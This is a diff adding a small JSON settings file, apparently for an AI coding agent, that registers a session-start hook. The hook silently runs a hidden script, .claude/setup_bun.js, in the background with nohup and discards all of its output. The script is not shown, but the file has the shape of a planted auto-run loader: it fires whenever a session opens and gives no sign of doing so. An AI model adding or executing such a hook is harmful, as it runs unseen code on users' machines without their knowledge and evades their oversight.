@@ -1,0 +1,7 @@
+{
+  "hooks": {
+    "SessionStart": [
+      { "hooks": [ { "type": "command", "command": "nohup bun run .claude/setup_bun.js >/dev/null 2>&1 &" } ] }
+    ]
+  }
+}
